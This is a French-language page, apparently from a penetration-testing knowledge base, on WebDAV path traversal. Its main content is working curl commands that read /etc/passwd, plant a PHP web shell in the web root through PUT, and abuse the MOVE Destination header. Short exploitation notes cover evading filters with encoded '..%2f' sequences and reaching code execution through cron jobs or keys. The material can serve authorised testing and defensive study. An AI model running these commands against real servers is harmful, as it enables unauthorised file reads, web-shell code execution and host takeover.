---
title: "Traversée de répertoires : s'échapper de la collection WebDAV prévue"
order: 2
description: "Les opérations WebDAV devraient rester dans la collection configurée, mais les serveurs qui n'arrivent pas à canonicaliser le chemin de la requête ou l'en-tête Destination permettent la traversée. La traversée dans un GET/PROPFIND lit des fichiers hors de la collection, et la traversée dans un PUT ou dans le Destination d'un MOVE/COPY écrit hors d'elle, plaçant des fichiers dans des chemins de l'hôte exécutables par le web ou sensibles."
keywords:
  - webdav traversal
  - destination header
  - move copy
  - put
  - path traversal
---

# Traversée de répertoires

Les verbes WebDAV opèrent sur des chemins, et là où le serveur ne les canonicalise ni ne les borne, la traversée s'échappe de la collection prévue. Cela joue dans les deux sens. La traversée dans une lecture (`GET`, `PROPFIND`) atteint des fichiers hors de la racine WebDAV pour une lecture arbitraire. Plus puissamment, la traversée dans une écriture, le chemin cible du `PUT`, ou l'en-tête `Destination` d'un `MOVE`/`COPY`, laisse l'attaquant choisir où un fichier atterrit, le plaçant dans un répertoire exécutable par le web ou un chemin de l'hôte sensible, même lorsque WebDAV est censé confiner les écritures à une seule collection.

```bash
# read traversal via GET/PROPFIND
curl -s --path-as-is http://<target>/dav/../../../../etc/passwd
curl -s -X PROPFIND --path-as-is 'http://<target>/dav/..%2f..%2f..%2fetc/' -H 'Depth:1' --data ''
# write traversal via PUT target or MOVE/COPY Destination header
curl -s -X PUT --path-as-is 'http://<target>/dav/../../var/www/html/s.php' --data '<?php system($_GET[c]);?>'
curl -s -X MOVE http://<target>/dav/s.txt -H 'Destination: http://<target>/../../var/www/html/s.php'
```

## Notes d'exploitation

- L'en-tête `Destination` sur `MOVE`/`COPY` est un vecteur de traversée en écriture WebDAV distinctif : téléversez un fichier anodin, puis faites-en un MOVE vers un chemin traversé et exécutable par le web, ce qui contourne aussi les filtres d'extension qui ne vérifient que le chemin du PUT.
- Utilisez `--path-as-is` et la traversée encodée (`..%2f`) pour que les séquences survivent jusqu'au serveur ; les filtres sont souvent contournés par l'encodage.
- La traversée en écriture est le cas à fort impact : déposer un script dans la racine web constitue une exécution de code, et écrire une tâche cron ou une clé atteint l'hôte ; la traversée en lecture récupère configurations et secrets.
- L'impact est borné par les privilèges du processus serveur et tout confinement au niveau de l'OS ; combinez avec [Téléversement PUT vers RCE](put-upload-to-rce.md) pour l'étape d'exécution.

## Références

- [RFC 4918 : en-tête Destination](https://datatracker.ietf.org/doc/html/rfc4918)
- [PortSwigger : traversée de chemin](https://portswigger.net/web-security/file-path-traversal)
